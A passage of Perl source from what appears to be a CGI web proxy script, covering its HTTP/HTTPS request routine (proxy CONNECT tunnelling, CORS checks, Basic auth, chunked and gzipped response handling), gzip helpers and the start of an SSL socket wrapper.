	my($dont_proxy) ;
	foreach (@NO_PROXY) {
	    $dont_proxy= 1, last if $host=~ /\Q$_\E$/i ;
	}
	unless ($dont_proxy) {
	    ($realhost, $realport)=
		$HTTP_PROXY=~ m#^(?:http://)?([^/?:]*):?([^/?]*)#i ;
	    $realport= 80 if $realport eq '' ;
	    $request_uri= "$scheme://$authority$request_uri" ;  # rebuild to include encoded path
	    $proxy_auth_header= "Proxy-Authorization: Basic $PROXY_AUTH"
	       if $PROXY_AUTH ne '' ;
	}
    }

    HTTP_GET: {

	if ($scheme eq 'https') {
	    my($dont_proxy) ;
	    if ($SSL_PROXY) {
		foreach (@NO_PROXY) {
		    $dont_proxy= 1, last if $host=~ /$_$/i ;
		}
	    }

	    if ($SSL_PROXY && !$dont_proxy) {
		($realhost, $realport)=
		    $SSL_PROXY=~ m#^(?:http://)?([^/?:]*):?([^/?]*)#i ;
		$realport= 80 if $realport eq '' ;
		&newsocketto('S_PLAIN', $realhost, $realport) ;

		# Send CONNECT request.
		print S_PLAIN "CONNECT $hostst:$port HTTP/$HTTP_VERSION\015\012",
			      'Host: ', $hostst, $portst, "\015\012" ;
		print S_PLAIN "Proxy-Authorization: Basic $SSL_PROXY_AUTH\015\012"
		    if $SSL_PROXY_AUTH ne '' ;
		print S_PLAIN "\015\012" ;

		# Wait a minute for the response to start
		vec($rin= '', fileno(S_PLAIN), 1)= 1 ;
		select($rin, undef, undef, 60)
		    || &HTMLdie("No response from SSL proxy") ;

		# Read response to CONNECT.  All we care about is the status
		#   code, but we have to read the whole response.
		my($response, $status_code) ;
		do {
		    $response= '' ;
		    do {
			$response.= $_= <S_PLAIN> ;
		    } until (/^(\015\012|\012)$/) ; #lines end w/ LF or CRLF
		    ($status_code)= $response=~ m#^HTTP/\d+\.\d+\s+(\d+)# ;
		} until $status_code ne '100' ;

		# Any 200-level response is OK; fail otherwise.
		&HTMLdie(['SSL proxy error; response was:<p><pre>%s</pre>', $response])
		    unless $status_code=~ /^2/ ;

	    # If not using a proxy, then open a socket directly to the server.
	    } else {
		&newsocketto('S_PLAIN', $realhost, $realport) ;
	    }

	    # Either way, make an SSL socket S tied to the plain socket S_PLAIN.
	    my $ssl_obj= tie(*S, 'SSL_Handle', \*S_PLAIN) ;
	    Net::SSLeay::connect($ssl_obj->{SSL}) or &HTMLdie(["Can't SSL connect: %s", $!]) ;


	} else {
	    &newsocketto('S', $realhost, $realport) ;
	}


	binmode S ;   # see note with "binmode STDOUT", above


	if ($doing_cors_preflight_request) {
	    $doing_cors_preflight_request= 0 ;
	} elsif (    ($xhr_origin ne '' and "$scheme://$hostst:$port" ne $xhr_origin)
		 and (   !$ENV{REQUEST_METHOD}=~ /^(?:GET|HEAD|POST)$/
		      or (grep { !(   /^(?:accept|accept-language|content-language|$)$/i
				or (    $_ eq 'content-type'
				    and $ENV{HTTP_CONTENT_TYPE}=~ m#^(?:application/x-www-form-urlencoded|multipart/form-data|text/plain)\s*(?:;|$)#i)
				  )
			       } @xhr_headers) ) )
	{
	    $doing_cors_preflight_request= 1 ;
	}


	my @req_headers= ("Host: $hostst$portst",    # needed for multi-homed servers
			  "Accept: $env_accept",    # possibly modified
			  "User-Agent: " . ($USER_AGENT || $ENV{'HTTP_USER_AGENT'}) ) ;

	push(@req_headers, $proxy_auth_header)  if $proxy_auth_header ;

	if ($ENV{HTTP_ACCEPT_ENCODING}=~ /\bgzip\b/i) {
	    eval { require IO::Uncompress::Gunzip } ;  # don't check during compilation
	    push(@req_headers, ('Accept-Encoding: ' . ($@  ? ','  : 'gzip'))) ; 
	} else {
	    push(@req_headers, 'Accept-Encoding: ,') ;
	}
	push(@req_headers, "Accept-Language: $ENV{HTTP_ACCEPT_LANGUAGE}")
	    if $ENV{HTTP_ACCEPT_LANGUAGE} ne '' ;

	my($referer)= $ENV{'HTTP_REFERER'} ;
	if (@PROXY_GROUP) {
	    foreach (@PROXY_GROUP) {
		if ($referer=~ s#^$_(?:/[^/]*/?[^/]*/?)?##  &&  ($referer ne '')) {
		    my $decoded_referer= &wrap_proxy_decode($referer) ;
		    push(@req_headers, "Referer: $decoded_referer")
			unless $e_hide_referer or ($decoded_referer=~ /^https\b/i && $scheme eq 'http')
			    or $xhr_origin=~ /^blob:/i or $xhr_origin eq 'null' ;
		    last ;
		}
		last if $referer eq '' ;
	    }
	} else {
	    if ($referer=~ s#^$THIS_SCRIPT_URL(?:/[^/]*/?[^/]*/?)?##  &&  ($referer ne '')) {
		my $decoded_referer= &wrap_proxy_decode($referer) ;
		push(@req_headers, "Referer: $decoded_referer")
		    unless $e_hide_referer or ($decoded_referer=~ /^https\b/i && $scheme eq 'http')
			or $xhr_origin=~ /^blob:/i or $xhr_origin eq 'null' ;
	    }
	}

	push(@req_headers, 'Connection: close')
	    if $HTTP_VERSION eq '1.1' and ($RUN_METHOD eq 'mod_perl' or $RUN_METHOD eq 'cgi') ;

	push(@req_headers, "Cookie: $cookie_to_server")
	    if !$cookies_are_banned_here and ($cookie_to_server ne '')
		and !$xhr_omit_credentials and !$doing_cors_preflight_request ;

	push(@req_headers, "Pragma: $ENV{HTTP_PRAGMA}")  if $ENV{HTTP_PRAGMA} ne '' ;
	push(@req_headers, "Cache-Control: $ENV{HTTP_CACHE_CONTROL}")  if $ENV{HTTP_CACHE_CONTROL} ne '' ;


	# Add Authorization: header if we've had a challenge.
	if (!$doing_cors_preflight_request and !$xhr_omit_credentials) {
	    if ($realm ne '') {
		# If we get here, we know $realm has a defined $auth and has not
		#   been tried.
		push(@req_headers, "Authorization: Basic $auth{$realm}") ;
		$tried_realm= $realm ;

	    } else {
		if ($username ne '') {
		    push(@req_headers, 'Authorization: Basic ' . &base64($username . ':' . $password)) ;
		} elsif ( ($tried_realm,$auth)= each %auth ) {
		    push(@req_headers, "Authorization: Basic $auth") ;
		}
	    }
	}


	# Some old XMLHTTPRequest server apps require this non-standard header.
	# Thanks to Devesh Parekh for the patch.
	push(@req_headers, "X-Requested-With: $ENV{HTTP_X_REQUESTED_WITH}")
	    if $expected_type eq 'x-proxy/xhr' and $ENV{HTTP_X_REQUESTED_WITH} eq 'XMLHttpRequest' ;

	# More non-standard HTTP request headers.
	push(@req_headers, "X-Do-Not-Track: 1")  if $ENV{HTTP_X_DO_NOT_TRACK} eq '1' ;
	push(@req_headers, "DNT: 1")  if $ENV{HTTP_DNT} eq '1' ;

	# jsm-- what is this used for?  test with video on iPad etc.
	push(@req_headers, "X-Playback-Session-Id: $ENV{HTTP_X_PLAYBACK_SESSION_ID}")
	    if defined $ENV{HTTP_X_PLAYBACK_SESSION_ID} ;

	$use_range= !$dont_use_range
		    && defined($ENV{HTTP_RANGE})
		    && $expected_type!~ /^$TYPES_TO_HANDLE_REGEX$/io ;
	push(@req_headers, "Range: $ENV{HTTP_RANGE}")  if $use_range ;


	# Add any CORS headers.
	# A bit messy-- should we make a dedicated preflight routine?
	push(@req_headers, "Origin: $xhr_origin")  if $xhr_origin ne '' ;
	if ($doing_cors_preflight_request) {
	    push(@req_headers, "Access-Control-Request-Method: $ENV{REQUEST_METHOD}") ;
	    push(@req_headers, 'Access-Control-Request-Headers: ' . join(',', sort @xhr_headers))
		if @xhr_headers ;
	    # Remove author request headers... kind of hacky, inefficient.
	    foreach my $xh (@xhr_headers) {
		@req_headers= grep { !/^\Q$xh:/i } @req_headers ;
	    }
	} else {
	    foreach (@xhr_headers) {
		my $env_name= 'HTTP_' . uc ;
		$env_name=~ s/-/_/g ;
		push(@req_headers, "$_: $ENV{$env_name}") if $ENV{$env_name} ne '' ;
	    }
	}


	if (!$doing_cors_preflight_request and $ENV{'REQUEST_METHOD'} eq 'POST') {

	    if ($body_too_big) {
		# Quick 'n' dirty response for an unlikely occurrence.
		# 413 is not actually an HTTP/1.0 response...
		&HTMLdie(["Sorry, this proxy can't handle a request larger "
			. "than %s bytes at a password-protected"
			. " URL.  Try reducing your submission size, or submit "
			. "it to an unprotected URL.", $MAX_REQUEST_SIZE],
			 'Submission too large',
			 '413 Request Entity Too Large') ;
	    }

	    # Otherwise...
	    $lefttoget= $ENV{'CONTENT_LENGTH'} ;
	    push(@req_headers, "Content-Type: $ENV{'CONTENT_TYPE'}",
			       "Content-Length: $lefttoget") ;

	}


	# To make traffic fingerprinting harder.
	shuffle(\@req_headers) ;

	# Send the request.
	my $method= $doing_cors_preflight_request  ? 'OPTIONS'  : $ENV{'REQUEST_METHOD'} ;
	print S "$method $request_uri HTTP/$HTTP_VERSION\015\012",
		join("\015\012", @req_headers),
		"\015\012\015\012" ;


	# Print POST body if needed.
	if (!$doing_cors_preflight_request and $method eq 'POST') {
	    if (@postbody) {
		print S @postbody ;
	    } else {
		$body_too_big= ($lefttoget > $MAX_REQUEST_SIZE) ;

		# Loop to guarantee all is read from $STDIN.
		do {
		    $lefttoget-= read($STDIN, $postblock, $lefttoget) ;
		    print S $postblock ;
		    # efficient-- only doing test when input is slow anyway.
		    push(@postbody, $postblock) unless $body_too_big ;
		} while $lefttoget && ($postblock ne '') ;
	    }
	}


	# Wait a minute for the response to start
	vec($rin= '', fileno(S), 1)= 1 ;
	select($rin, undef, undef, 60)
	    || &HTMLdie(["No response from %s:%s", $realhost, $realport]) ;


	#------ Read full response into $status, $headers, and $body ----

	# Support both HTTP 1.x and HTTP 0.9
	$status= <S> ;  # first line, which is the status line in HTTP 1.x


	# HTTP 0.9
	# Ignore possibility of HEAD, since it's not defined in HTTP 0.9.
	# Do any HTTP 0.9 servers really exist anymore?
	unless ($status=~ m#^HTTP/#) {
	    $is_html= 1 ;   # HTTP 0.9 by definition implies an HTML response
	    $content_type= 'text/html' ;
	    local($/)= undef ;
	    $body= $status . <S> ;
	    $status= '' ;

	    close(S) ;
	    untie(*S) if $scheme eq 'https' ;
	    return ;
	}


	# Loop to get $status and $headers until we get a non-100 response.
	do {
	    ($status_code)= $status=~ m#^HTTP/\d+\.\d+\s+(\d+)# ;

	    $headers= '' ;   # could have been set by first attempt
	    do {
		$headers.= $_= <S> ;    # $headers includes last blank line
#	    } until (/^(\015\012|\012)$/) || eof(S) ; # lines end w/ LF or CRLF
	    } until (/^(\015\012|\012)$/) || $_ eq '' ; #lines end w/ LF or CRLF

	    $status= <S> if $status_code == 100 ;  # re-read for next iteration
	} until $status_code != 100 ;

	# Unfold long header lines, a la RFC 822 section 3.1.1
	$headers=~ s/(\015\012|\012)[ \t]+/ /g ;


	# Messy-- from algorithms in section 7 of
	#   https://dvcs.w3.org/hg/cors/raw-file/tip/Overview.html#user-agent-processing-model

	# Returning from this routine cancels the request and intentionally
	#   generates a CORS "network error".
	return if ($doing_cors_preflight_request or $cors_preflight_done) and !$status=~ m#^HTTP/\d+\.\d+\s+200\b# ;

	# Apply CORS redirect steps if needed.
	if ($xhr_origin ne '' and $status=~ m#^HTTP/\d+\.\d+\s+30[1237]\b#) {
	    return if $cors_preflight_done ;
	    my($new_url)= $headers=~ /^Location:\s*(\S*)/mi ;
	    return unless $new_url=~ /^(?:https?|ftp)$/i ;
	    return if $new_url=~ m#^(?:[\w+.-]+)://(?:[^/?]*)\@#i ;
	    return unless $headers=~ /^Access-Control-Allow-Origin:/mi ;
	    return if $headers=~ /^Access-Control-Allow-Origin:.*^Access-Control-Allow-Origin:/mis ;
	    if (!$xhr_omit_credentials or !$headers=~ /^Access-Control-Allow-Origin:\s*\*/mi) {
		return unless $headers=~ /^(?i:Access-Control-Allow-Origin:)\s*\Q$xhr_origin\E\s*\015?\012/m ;
		return if !$xhr_omit_credentials
		    and (!$headers=~ /^Access-Control-Allow-Credentials:\s*true/mi
			 or $headers=~ /^Access-Control-Allow-Credentials:.*^Access-Control-Allow-Credentials:/mis) ;
		my($new_scheme, $new_origin)= $new_url=~ m#^(([\w+.-]+)://[^/?]*)# ;
		$new_scheme= lc($new_scheme) ;
		$new_origin= lc($new_origin) ;
		$new_origin.= $new_scheme eq 'http'  ? ':80'  : $new_scheme eq 'https'  ? ':443'  : ''
		    unless $new_origin=~ /:\d+$/ ;
		$xhr_origin= 'null'  if $xhr_origin ne $new_origin ;   # close enough?
	    }

	# Perform only resource sharing check.
	} elsif ($xhr_origin ne '') {
	    return unless $headers=~ /^Access-Control-Allow-Origin:/mi ;
	    return if $headers=~ /^Access-Control-Allow-Origin:.*^Access-Control-Allow-Origin:/mis ;
	    if (!$xhr_omit_credentials or !$headers=~ /^Access-Control-Allow-Origin:\s*\*/mi) {
		return unless $headers=~ /^(?i:Access-Control-Allow-Origin:)\s*\Q$xhr_origin\E\s/m ;
		return if !$xhr_omit_credentials
		    and (!$headers=~ /^Access-Control-Allow-Credentials:\s*true/mi
			 or $headers=~ /^Access-Control-Allow-Credentials:.*^Access-Control-Allow-Credentials:/mis) ;
	    }
	}

	if ($doing_cors_preflight_request) {
	    # We know response status code is 200 here.
	    my @methods= grep { /\S/ } map { split(/\,\s*/) }
					   $headers=~ /^Access-Control-Allow-Methods:\s*([^\015\012]+)/mig ;
	    @methods= ($ENV{REQUEST_METHOD})  unless @methods ;
	    my @headers= grep { /\S/ } map { split(/\,\s*/) }
					   $headers=~ /^Access-Control-Allow-Headers:\s*([^\015\012]+)/mig ;
	    return unless grep { $ENV{REQUEST_METHOD} eq $_ } @methods, qw(GET HEAD POST) ;
	    foreach my $xh (@xhr_headers) {
		return if !(   /^(?:accept|accept-language|content-language|$)$/i
			    or (    $_ eq 'content-type'
				and $ENV{HTTP_CONTENT_TYPE}=~ m#^(?:application/x-www-form-urlencoded|multipart/form-data|text/plain)$#i)
			   )
			   and !grep { lc($xh) eq lc } @headers ;
	    }
	    $cors_preflight_done= 1 ;
	    close(S) ;
	    untie(*S) if $scheme eq 'https' ;
	    redo HTTP_GET ;   # do actual request
	}



	# Check for 401 Unauthorized response
	if ($status=~ m#^HTTP/\d+\.\d+\s+401\b#) {
	    ($realm)=
		$headers=~ /^WWW-Authenticate:\s*Basic\s+realm="([^"\015\012]*)/mi ;

	    # 401 responses are required to have WWW-Authenticate: headers,
	    #   but at least one server doesn't obey this.  If we don't get
	    #   that header, then continue on to return the proxified
	    #   response body to the user.
	    #&HTMLdie("Error by target server: no WWW-Authenticate header.")
	    #    unless $realm ne '' ;

	    if ($realm ne '') {
		if ($auth{$realm} eq '') {
		    &get_auth_from_user("$hostst$portst", $realm, $URL) ;
		} elsif ($realm eq $tried_realm) {
		    &get_auth_from_user("$hostst$portst", $realm, $URL, 1) ;
		}

		# so now $realm exists, has defined $auth, and has not been tried
		close(S) ;
		untie(*S) if $scheme eq 'https' ;
		redo HTTP_GET ;
	    }
	}



	# Extract $content_type, used in several places
	($content_type, $charset)=
	    $headers=~ m#^Content-Type:\s*([\w/.+\$-]*)\s*;?\s*(?:charset\s*=\s*([\w-]+))?#mi ;
	$content_type= lc($content_type) ;


	# If we're text only, then cut off non-text responses (but allow
	#   unspecified types).
	if ($TEXT_ONLY) {
	    if ( ($content_type ne '') && ($content_type!~ m#^text/#) ) {
		&non_text_die ;
	    }
	}

	# If we're removing scripts, then disallow script MIME types.
	if ($content_type=~ /^$SCRIPT_TYPE_REGEX$/io) {
	    &script_content_die  if $scripts_are_banned_here ;
	    &script_content_die  if !match_csp_source_list('script-src', $URL) ;

	    # Note that the non-standard Link: header, which may link to a
	    #   style sheet, is handled in http_fix().
	}


	# If URL matches one of @BANNED_IMAGE_URL_PATTERNS, then skip the
	#   resource unless it's clearly a text type.
	if ($images_are_banned_here) {
	    &skip_image  unless $content_type=~ m#^text/#i ;
	}

	# Keeping $base_url and its related variables up-to-date is an
	#   ongoing job.  Here, we look in appropriate headers.  Note that if
	#   Content-Base: doesn't exist, Content-Location: is an absolute URL.
	if        ($headers=~ m#^Content-Base:\s*([\w+.-]+://\S+)#mi) {
	    $base_url= $1, &fix_base_vars ;
	} elsif   ($headers=~ m#^Content-Location:\s*([\w+.-]+://\S+)#mi) {
	    $base_url= $1, &fix_base_vars ;
	} elsif   ($headers=~ m#^Location:\s*([\w+.-]+://\S+)#mi) {
	    $base_url= $1, &fix_base_vars ;
	}


	&http_fix ;


	if ($MINIMIZE_CACHING) {
	    my($new_value)= 'no-cache' ;
	    $new_value.= ', no-store'
		if $headers=~ /^Cache-Control:.*?\bno-store\b/mi ;
	    $new_value.= ', no-transform'
	      if $headers=~ /^Cache-Control:.*?\bno-transform\b/mi ;

	    my($no_cache_headers)=
		"Cache-Control: $new_value\015\012Pragma: no-cache\015\012" ;

	    $headers=~ s/^Cache-Control:[^\012]*\012?//mig ;
	    $headers=~ s/^Pragma:[^\012]*\012?//mig ;
	    $headers=~ s/^Expires:[^\012]*\012?//mig ;

	    $headers= $no_cache_headers . $headers ;
	}


	# Add the 1-2 session cookies if so configured.
	$headers= $session_cookies . $headers  if $session_cookies ;


	# Set $is_html if headers indicate HTML response.
	# Question: are there any other HTML-like MIME types, including x-... ?
	$is_html= 1  if   $content_type eq 'text/html'
		       or $content_type eq 'application/xhtml+xml' ;


	$is_html= 1  if ($content_type eq '') ;

	# If the expected type is "x-proxy/xhr", then the resource is being
	#   downloaded via a JS XMLHttpRequest object and should not be
	#   proxified, even if it's HTML data (it would be proxified later
	#   when the data is written to or inserted in a document).  To
	#   indicate this, we set $is_html to false.
	$is_html= 0  if ($expected_type eq 'x-proxy/xhr') ;

	# The Range: header shouldn't be sent for text/html resources, but
	#   we don't always know that in advance.  Fortunately, this shouldn't
	#   happen often.
	# Avoid doing this when $content_type is empty.  Messy.
	if ($is_html and $use_range and ($content_type ne '')) {
	    close(S) ;
	    untie(*S) if $scheme eq 'https' ;
	    $dont_use_range= 1 ;
	    redo HTTP_GET ;
	}

	# To support non-NPH hack, replace first part of $status with
	#   "Status:" if needed.
	$status=~ s#^\S+#Status:#  if $NOT_RUNNING_AS_NPH ;

	# A bug in some Sun servers returns "text/plain" for SWF files when
	#   responding to certain SWF method calls.
	my $may_be_swf= ($content_type eq 'text/plain'
			 and $headers=~ /^Server:\s*Sun-ONE/mi) ;



	# Read the response, modify as needed, and send back to the user.


	# Only read body if the request method is not HEAD
	if ($ENV{'REQUEST_METHOD'} eq 'HEAD') {
	    $body= '' ;
	    print $STDOUT $status, $headers ;


	} else {
	    # First, handle non-HTML content which needs modification.
	    # Again, anything retrieved via a JS XMLHttpRequest object should
	    #   not be proxified, regardless of $content_type .

	    if ( ($expected_type ne 'x-proxy/xhr') &&
		 (   ($expected_type=~ /^$TYPES_TO_HANDLE_REGEX$/io)
		  || ($content_type=~  /^$TYPES_TO_HANDLE_REGEX$/io)
		  || $may_be_swf )  )
	    {
		# Because of the erroneous way some browsers use the expected
		#   MIME type instead of the actual Content-Type: header, check
		#   $expected_type first.
		my($type) ;
		if ($expected_type=~ /^$TYPES_TO_HANDLE_REGEX$/io) {
		    $type= $expected_type ;
		} else {
		    $type= $content_type ;
		}

		# If response is chunked, then dechunk it before processing.
		# Not perfect (it loses the benefit of chunked encoding), but it
		#   works and will seldom be a problem.
		# Append $footers into $headers, and remove any Transfer-Encoding: header.
		if ($headers=~ /^Transfer-Encoding:[ \t]*chunked\b/mi) {
		    ($body, $footers)= &get_chunked_body('S') ;
		    &HTMLdie(["Error reading chunked response from %s .", &HTMLescape($URL)])
			unless defined($body) ;
		    $headers=~ s/^Transfer-Encoding:[^\012]*\012?//mig ;
		    $headers=~ s/^(\015\012|\012)/$footers$1/m ;

		# Handle explicitly sized response.
		} elsif ($headers=~ /^Content-Length:[ \t]*(\d+)/mi) {
		    $body= &read_socket('S', $1) ;

		# If not chunked or sized, read entire input into $body.
		} else {
		    local($/)= undef ;
		    $body= <S> ;
		}

		shutdown(S, 0)  if $RUNNING_ON_IIS ;  # without this, IIS+MSIE hangs

		# If $body is gzipped, then gunzip it.
		# Change $headers to maintain consistency, even though it will
		#   probably just be compressed again later.
		&gunzip_body  if $headers=~ /^Content-Encoding:.*\bgzip\b/mi ;

		# A body starting with "\xEF\xBB\xBF" (non-standardly) indicates
		#   a UTF-8 resource.  We can only know this after reading
		#   $body, thus it's done here and not above.
		# The string "\xEF\xBB\xBF" is sort of like a non-standard BOM 
		#   for UTF-8, though UTF-8 doesn't need a BOM.  Some systems
		#   don't handle it, so remove it if found.
		$charset= 'UTF-8' if $body=~ s/^\xef\xbb\xbf// ;

		# Decode $body for text resources.
		if ($content_type=~ m#^text/#) {
		    eval { $body= decode($charset || 'ISO-8859-1', $body) } ;
		    &malformed_unicode_die($charset || 'ISO-8859-1') if $@ ;
		}

		# If $body looks like it's in UTF-16 encoding, then convert it
		#   to UTF-8 before proxifying.
		un_utf16(\$body), $charset= 'UTF-8' if ($body=~ /^(?:\376\377|\377\376)/) ;

		# Part of workaround for Sun servers (see $may_be_swf above).
		if ($may_be_swf && $body=~ /^[FC]WS[\x01-\x09]/) {
		    $type= 'application/x-shockwave-flash' ;
		}

		# If Content-Type: is "text/html" and body looks like HTML,
		#   then treat it as HTML.  This helps with sites that play
		#   fast and loose with MIME types (e.g. hotmail).  Hacky.
		# Remove leading HTML comments before testing for text/html;
		#   e.g. hotmail puts HTML comments at start of JS resources,
		#   and even gives Content-Type as text/html .  :P
		my($leading_html_comments)= $body=~ /^(\s*(?:<!--.*-->\s*)*)/ ;
		$body= substr($body, length($leading_html_comments))
		    if $leading_html_comments ;

		if (($content_type eq 'text/html') and $body=~ /^\s*<(?:\!(?!--\s*\n)|html)/) {
		    $type= 'text/html' ;
		    $is_html= 1 ;           # for block below
		    $body= $leading_html_comments . $body ;

		} else {

		    $body= (&proxify_block($body, $type))[0] ;

		    # Re-enbyte $body.
		    eval { $body= encode($charset || 'ISO-8859-1', $body) } ;
		    &malformed_unicode_die($charset || 'ISO-8859-1') if $@ ;

		    # gzip the response body if we're allowed and able.
		    &gzip_body if $ENV{HTTP_ACCEPT_ENCODING}=~ /\bgzip\b/i ;

		    $headers=~ s/^Content-Length:.*/
				 'Content-Length: ' . length($body) /mie ;

		    print $STDOUT $status, $headers, $body ;

		    close(S) ;
		    untie(*S) if $scheme eq 'https' ;
		    return ;
		}

	    } elsif (!$is_html) {
		my($buf) ;
		print $STDOUT $status, $headers ;

		# Use Content-Length: if available.
		if ($headers=~ /^Content-Length:[ \t]*(\d+)/mi) {
		    my $lefttoget= $1 ;
		    my $thisread ;
		    while ($lefttoget>0 and $thisread= read(S, $buf, ($lefttoget<16384) ? $lefttoget : 16384)) {
			&HTMLdie(["read() error: %s", $!])  unless defined $thisread ;
			print $STDOUT $buf ;
			$lefttoget-= $thisread ;
		    }

		# Pass through response if chunked.
		} elsif ($headers=~ /^Transfer-Encoding:[ \t]*chunked\b/mi) {
		    # Get chunks.
		    my $hex_size ;
		    while ($hex_size= <S>) {
			print $STDOUT $hex_size ;
			no warnings 'digit' ;  # to let hex() operate without warnings
			last unless $lefttoget= hex($hex_size) ;
			my $thisread ;
			while ($lefttoget>0 and $thisread= read(S, $buf, ($lefttoget<16384) ? $lefttoget : 16384)) {
			    &HTMLdie(["chunked read() error: %s", $!])  unless defined $thisread ;
			    print $STDOUT $buf ;
			    $lefttoget-= $thisread ;
			}
			print $STDOUT scalar <S> ;    # clear CRLF after chunk
		    }
		    # Get footers.
		    while (<S>) {
			print $STDOUT $_ ;
			last if /^(\015\012|\012)/  || $_ eq '' ;   # lines end w/ LF or CRLF
		    }

		# If no indication of response length, just pass all socket data through.
		} else {
		    # If using SSL, read() could return 0 and truncate data. :P
		    print $STDOUT $buf while read(S, $buf, 16384) ;
		}
	    }



	    # This could have been set in the if() block above.
	    if ($is_html) {

		my($transmit_in_parts) ;
		foreach (@TRANSMIT_HTML_IN_PARTS_URLS) {
		    $transmit_in_parts= 1, last  if $URL=~ /$_/ ;
		}

		# Transmit the HTML in parts if so configured. 
		if ($transmit_in_parts) {
		    &transmit_html_in_parts($status, $headers, 'S') ;


		} else {
		    # If response is chunked, handle as above; see comments there.
		    if ($headers=~ /^Transfer-Encoding:[ \t]*chunked\b/mi) {
			($body, $footers)= &get_chunked_body('S') ;
			&HTMLdie(["Error reading chunked response from %s .", &HTMLescape($URL)])
			    unless defined($body) ;
			$headers=~ s/^Transfer-Encoding:[^\012]*\012?//mig ;
			$headers=~ s/^(\015\012|\012)/$footers$1/m ;

		    # Handle explicitly sized response.
		    } elsif ($headers=~ /^Content-Length:[ \t]*(\d+)/mi) {
			$body= &read_socket('S', $1) ;

		    # If not chunked or sized, read entire input into $body.
		    } else {
			undef $/ ;
			$body= <S> ;
		    }

		    shutdown(S, 0)  if $RUNNING_ON_IIS ;  # without this, IIS+MSIE hangs

		    # If $body is gzipped, then gunzip it.
		    # Change $headers to maintain consistency, even though it will
		    #   probably just be compressed again later.
		    &gunzip_body  if $headers=~ /^Content-Encoding:.*\bgzip\b/mi ;

		    # Due to a bug in (at least some) captcha systems, where they label
		    #   the test image as "text/html", we test for the image here by
		    #   examining the first 1000 chars for non-printable chars.
		    if ($env_accept=~ m#^\s*image/#i) {
			my $binchars= substr($body, 0, 1000)=~ tr/\x00-\x08\x0b\x0c\x0e-\x1b\x80-\xff/\x00-\x08\x0b\x0c\x0e-\x1b\x80-\xff/ ;
			if ($binchars > ( (length($body)<1000) ? length($body)*0.25 : 250 )) {
			    print $STDOUT $status, $headers, $body ;
			    close(S) ;
			    untie(*S) if $scheme eq 'https' ;
			    return ;
			}
		    }

		    # Quick check for "<meta charset=...>" in $body.
		    ($meta_charset)= $body=~ /^.{0,1024}?<\s*meta[^>]+\bcharset\s*=['"]?([^'"\s>]+)/si ;

		    # Decode $body.
		    eval { $body= decode($charset || $meta_charset || 'ISO-8859-1', $body) } ;
		    &malformed_unicode_die($charset || $meta_charset || 'ISO-8859-1') if $@ ;

		    # If $body looks like it's in UTF-16 encoding, then convert
		    #   it to UTF-8 before proxifying.
		    un_utf16(\$body), $charset= 'UTF-8' if ($body=~ /^(?:\376\377|\377\376)/) ;
		    
		    $body= &proxify_html(\$body, 1) ;

		    # $body.= $debug ;   # handy for sprinkling checks throughout the code

		    # Must change to byte string before compressing or sending.
		    # For HTML resources, use UTF-8 to make insertions behave correctly.
		    eval { $body= encode('UTF-8', $body) } ;
		    &malformed_unicode_die('UTF-8') if $@ ;
		    $headers=~ s/^(Content-Type:[^\015\012;]*)[^\015\012]*/$1; charset=UTF-8/gmi ;

		    # gzip the response body if we're allowed and able.
		    &gzip_body if $ENV{HTTP_ACCEPT_ENCODING}=~ /\bgzip\b/i ;

		    # Change Content-Length header, since we changed the content.
		    $headers=~ s/^Content-Length:.*\012/
		    'Content-Length: ' . length($body) . "\015\012"/mie ;

		    print $STDOUT $status, $headers, $body ;
		}
	    }
	}

	close(S) ;
	untie(*S) if $scheme eq 'https' ;

    }  # HTTP_GET:

}  # sub http_get()



# gzip $body and add appropriate response header to $headers.
# Used in several places.
sub gzip_body {
    eval { require IO::Compress::Gzip } ;
    if (!$@) {
	my $zout ;
	IO::Compress::Gzip::gzip(\$body, \$zout)
	    or HTMLdie(["Couldn't gzip: %s", $IO::Compress::Gzip::GzipError]);
	$body= $zout ;
	$headers= "Content-Encoding: gzip\015\012" . $headers ;
    }
}

# gunzip $body and remove appropriate response header from $headers.
# Used in several places.
sub gunzip_body {
    eval { require IO::Uncompress::Gunzip } ;
    &no_gzip_die if $@ ;
    my $zout ;
    # If we err and yet $zout isn't empty, then use $zout anyway.  In other
    #   words, only HTMLdie() if gunzip fails and $zout is empty.
    no warnings qw(once) ;
    (IO::Uncompress::Gunzip::gunzip(\$body => \$zout) or $zout ne '')
	or HTMLdie(["Couldn't gunzip: %s", $IO::Uncompress::Gunzip::GunzipError]) ;
    $body= $zout ;
    $headers=~ s/^Content-Encoding:.*?\012//gims ;
}



BEGIN {
    package SSL_Handle ;

    use vars qw($SSL_CONTEXT  $DEFAULT_READ_SIZE) ;

    $DEFAULT_READ_SIZE= 512 ;   # Only used for <> style input, so doesn't need to be big.

    sub TIEHANDLE {
	my($class, $socket, $is_server, $unbuffered)= @_ ;
	my($ssl) ;

	create_SSL_CONTEXT($is_server) ;

	$ssl = Net::SSLeay::new($SSL_CONTEXT)
	    or &main::HTMLdie(["Can't create SSL connection: %s", $!]) ;
	Net::SSLeay::set_fd($ssl, fileno($socket))
	    or &main::HTMLdie(["Can't set_fd: %s", $!]) ;

	bless { SSL      => $ssl,
		socket   => $socket,
		readsize => ($unbuffered  ? 0  : $DEFAULT_READ_SIZE),
		buf      => '',
		eof      => '',
	      },
	    $class ;  # returns reference
    }


    sub create_SSL_CONTEXT {
	my($is_server)= @_ ;

	# $SSL_CONTEXT only needs to be created once (e.g. with mod_perl or daemon).
	unless ($SSL_CONTEXT) {
	    # load_error_strings() isn't worth the effort if running as a CGI script.
	    Net::SSLeay::load_error_strings() if $main::RUN_METHOD ne 'cgi' ;
	    Net::SSLeay::SSLeay_add_ssl_algorithms() ;
	    Net::SSLeay::randomize() ;

	    # Create the reusable SSL context
	    $SSL_CONTEXT= Net::SSLeay::CTX_new()
		or &main::HTMLdie(["Can't create SSL context: %s", $!]) ;

	    # Need this to cope with bugs in some other SSL implementations.
	    Net::SSLeay::CTX_set_options($SSL_CONTEXT, &Net::SSLeay::OP_ALL) ;

	    # Makes life easier if using blocking IO.  Flag 0x04 is SSL_MODE_AUTO_RETRY .
	    Net::SSLeay::CTX_set_mode($SSL_CONTEXT, 4) ;
	}

	# Set SSL key and certificate for server socket handles.
	# jsm-- must make UI for keys....
	if ($is_server) {
	    Net::SSLeay::CTX_use_RSAPrivateKey_file($SSL_CONTEXT, File::Spec->catfile($main::PROXY_DIR, $main::PRIVATE_KEY_FILE), &Net::SSLeay::FILETYPE_PEM)
		or Net::SSLeay::die_if_ssl_error("error with private key: $!") ;
